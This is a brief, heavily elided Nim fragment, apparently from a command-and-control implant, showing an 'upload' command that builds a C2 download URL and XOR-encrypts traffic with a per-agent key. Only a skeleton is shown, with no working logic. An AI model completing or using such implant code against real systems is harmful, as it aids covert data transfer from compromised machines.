...
proc upload*(ctx: NetworkCommandContext, cmdGuid: string, args: seq[string]): string =
    try:
        ...
        # Build C2 download URL using context helper
        let downloadUrl = ctx.buildDownloadUrl()
        ...
        let encryptedRequest = encryptData(requestBody, ctx.uniqueXorKey)
        ...
        let decryptedResponse = decryptData(response.body, ctx.uniqueXorKey)
